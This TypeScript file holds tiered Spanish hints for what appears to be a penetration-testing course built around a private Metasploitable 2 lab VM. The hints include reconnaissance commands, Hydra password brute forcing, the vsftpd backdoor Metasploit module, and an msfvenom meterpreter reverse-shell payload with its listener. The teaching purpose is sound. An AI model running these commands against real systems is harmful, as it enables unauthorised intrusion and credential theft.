/** Hints 1..5: conceptual, strategic, tool, command, solution */

export const DEFAULT_HINTS: [string, string, string, string, string] = [
  "Escribe en el formulario qué evidencia tienes (puertos, versiones). No pidas pista en vacío.",
  "Una fase: Recon → Enum → Vuln → Exploit. ¿En cuál estás atascado? Cambia de fase, no el mismo comando.",
  "Revisa el servicio con más superficie (SMB 445, FTP 21, HTTP 80) y enumera ESE primero.",
  "Si es SMB: enum4linux -a <IP>. Si es web dirs: gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt",
  "Solución completa: no la uses salvo que lleves >40 min sin evidencia nueva. Documenta el camino y pasa a recall de esa herramienta.",
];

export const HINTS_BY_SUBTOPIC: Record<string, [string, string, string, string, string]> = {
  "nmap-basic": [
    "Aún no enumeras servicios. Primero: ¿qué IPs responden en vboxnet0?",
    "Orden: -sn (vivos) → UNA IP → puertos → -sV → -oA.",
    "nmap. No Gobuster, no Hydra.",
    "nmap -sn 192.168.56.0/24",
    "Luego nmap -p- -sV <TARGET_MS2> -oA baseline. less el .nmap.",
  ],
  "nmap-versioning": [
    "Ya hay host vivo. La pregunta es QUÉ corre, no si pingea.",
    "Banner / versión, no host discovery.",
    "nmap -sV. -O es SO, otro flag.",
    "nmap -sV <IP>   o   nmap -p- -sV <IP>",
    "Columna VERSION: vsftpd 2.3.4, no solo ftp.",
  ],
  "nmap-scripts": [
    "Ya tienes puertos. Ahora un DATO (anon FTP, título HTTP), no un exploit.",
    "-sC = default. vuln es otra categoría. Script nombrado = una pregunta.",
    "nmap --script … y el puerto (-p21 / -p80 / -p445).",
    "nmap -sC -sV <IP>",
    "MS2: ftp-anon -p21 o smb-os-discovery -p445. Anota 1 hallazgo.",
  ],
  enum4linux: [
    "445/139 abierto. Información SIN autenticación primero.",
    "Usuarios, shares, política. No Metasploit todavía.",
    "enum4linux. No Gobuster.",
    "enum4linux -a <IP>",
    "Después smbclient -L <IP> -N y smbmap -H <IP>",
  ],
  "smb-manual": [
    "Ya listaste shares. Ahora ENTRAR, no otro -a.",
    "Cliente tipo FTP. Null session.",
    "smbclient -L / smbmap -H.",
    "smbclient -L <IP> -N",
    "Luego smbclient //IP/share -N  y smbmap -H <IP>",
  ],
  "ftp-ssh-enum": [
    "21 y 22 no son HTTP ni SMB.",
    "FTP: ¿anonymous? SSH: ¿versión o user conocido? Hydra después.",
    "ftp, nc :21, nmap ftp-anon / -sV -p22.",
    "nmap --script ftp-anon -p21 <IP>",
    "searchsploit es índice. No ejecutes el exploit hoy.",
  ],
  "tool-selection": [
    "Una pregunta: ¿qué buscas? Ruta, password, o info SMB.",
    "21 anonymous ≠ Gobuster. 22 sin user ≠ Hydra primero.",
    "Gobuster / Hydra / enum4linux / ftp / nmap -sV.",
    "445 → enum4linux. 80 → gobuster. login+user → hydra.",
    "Si fallas 2: dibuja la tabla en papel y repite recall.",
  ],
  "gobuster-dir": [
    "Es HTTP. Buscas rutas, no passwords ni SMB.",
    "curl -I primero. Luego diccionario de paths.",
    "gobuster modo dir: -u y -w.",
    "gobuster dir -u http://<TARGET_MS2> -w /usr/share/wordlists/dirb/common.txt",
    "Añade -x php,txt si buscas archivos. 403 también se anota. Hydra solo si hay form.",
  ],
  "hydra-bruteforce": [
    "Tienes un LOGIN y un USER, no un path HTTP ni un share.",
    "Credenciales. Lista corta en lab; rockyou es sintaxis de examen.",
    "hydra -l/-L -P servicio://IP -t 4",
    "hydra -l msfadmin -P ~/short-pass.txt -t 4 ssh://<TARGET_MS2>",
    "Si no hay user: enum SMB o para. No -l root + rockyou entero.",
  ],
  "msf-search-use": [
    "Aún no lanzas. Primero: ¿qué módulo coincide con el servicio?",
    "search acotado, luego use por ruta. No exploit todavía.",
    "msfconsole: search / use.",
    "search vsftpd",
    "use exploit/unix/ftp/vsftpd_234_backdoor  — para. show options es el siguiente bloque.",
  ],
  "msf-options": [
    "El módulo está elegido. Falta rellenar la tabla.",
    "Required yes vacío = no exploit.",
    "show options y set.",
    "show options",
    "set RHOSTS <TARGET_MS2> y otra vez show options.",
  ],
  "msf-lhost-lport": [
    "Reverse shell = la víctima llama a TU IP de lab (vboxnet0), no a la de ella.",
    "RHOSTS víctima. LHOST atacante. Mismo /24, IPs distintas.",
    "set LHOST del inet de vboxnet0, no wlan0.",
    "set RHOSTS <TARGET_MS2>  luego  set LHOST 192.168.56.1  set LPORT 4444",
    "show options otra vez. Required no puede estar vacío.",
  ],
  "msf-multihandler": [
    "El ELF/exe no abre sesión solo. Alguien tiene que escuchar.",
    "Mismo payload, LHOST y LPORT que msfvenom.",
    "use exploit/multi/handler",
    "use exploit/multi/handler",
    "set payload … ; set LHOST vboxnet0 ; set LPORT 4444 ; exploit -j -z",
  ],
  "msf-sysinfo": [
    "Ya hay sesión. Prompt meterpreter, no msf6.",
    "Quién es la máquina vs quién eres tú.",
    "sysinfo y getuid.",
    "sysinfo",
    "getuid. hashdump es otro subtema (Windows).",
  ],
  "msf-hashdump": [
    "¿La sesión es Windows? SAM ≠ shadow.",
    "En MS2 Linux: documenta N/A, no insistas.",
    "hashdump (solo Windows + privilegios).",
    "hashdump",
    "Linux: sysinfo/getuid y para.",
  ],
  msfvenom: [
    "Generas un archivo. No es un listener.",
    "LHOST = vboxnet0 incrustado. El handler debe coincidir.",
    "msfvenom -p … -f elf -o",
    "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f elf -o shell.elf",
    "Luego multi/handler con el mismo triplete. Solo tu VM.",
  ],
  "vuln-assessment": [
    "Tienes una VERSION de nmap. Pregunta: ¿hay hit público?",
    "Índice, no explotación.",
    "searchsploit nombre versión.",
    "searchsploit vsftpd 2.3.4",
    "Anota el hit. No -m + gcc. msf en TU MS2 si Semana 3.",
  ],
  "reverse-vs-bind": [
    "Dibuja la flecha TCP. ¿Quién llama?",
    "Reverse: tú escuchas (vboxnet0). Bind: tú conectas a RHOSTS.",
    "nc -lvnp para reverse.",
    "nc -lvnp 4444",
    "LHOST no es el guest ni wlan0.",
  ],
  "exploit-linux": [
    "Orden: nmap → enum del puerto → índice/msf → whoami.",
    "Solo TU VM Host-Only. Flujo Semana 3, no un blog.",
    "show options. RHOSTS guest. Reverse → LHOST vboxnet0.",
    "nmap -p- -sV -sC <TARGET_MS2>",
    "Documenta. hashdump SAM no aplica.",
  ],
  "lab-vbox": [
    "Kali es el SO del PC. La víctima es una VM. La pregunta es: ¿misma subnet Host-Only?",
    "Dibuja LHOST (vboxnet0) y RHOST (guest). Si no hay vboxnet0, no hay lab.",
    "ip addr y ip route. No nmap todavía si no hay interfaz.",
    "ip addr show vboxnet0   y   ping -c 3 <IP_MS2>",
    "Host-Only only en el guest. Anota LHOST y TARGET_MS2. NAT/Bridged off.",
  ],
  "linux-basic": [
    "¿Estás en Kali o en el guest? hostname y os-release.",
    "Permission denied ≠ No such file. ls -l e id.",
    "SSH: usuario@IP. msfadmin, no root.",
    "ssh msfadmin@<TARGET_MS2>",
    "Dentro: whoami. exit. nmap se corre en Kali.",
  ],
  "net-basic": [
    "Mira vboxnet0: ¿qué /24 es? No es 192.168.1.0/24 de casa.",
    "LHOST = inet de vboxnet0. RHOSTS = guest. 127.0.0.1 es DVWA.",
    "Puerto → protocolo. 445 no es HTTP.",
    "ip addr show vboxnet0",
    "Tabla: 22 SSH, 80 HTTP/Gobuster, 445 SMB/enum4linux.",
  ],
};

export function hintsForSubtopics(ids: string[]): [string, string, string, string, string] {
  for (const id of ids) {
    if (HINTS_BY_SUBTOPIC[id]) return HINTS_BY_SUBTOPIC[id];
  }
  return DEFAULT_HINTS;
}
